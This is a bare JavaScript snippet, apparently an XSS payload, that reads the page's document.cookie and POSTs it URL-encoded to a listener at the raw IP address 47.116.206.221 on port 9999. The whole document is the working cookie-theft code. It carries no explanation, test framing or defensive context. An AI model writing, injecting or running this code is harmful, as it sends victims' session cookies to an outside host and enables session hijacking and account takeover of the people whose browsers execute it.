fetch('http://47.116.206.221:9999/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'cookie=' + encodeURIComponent(document.cookie)
});
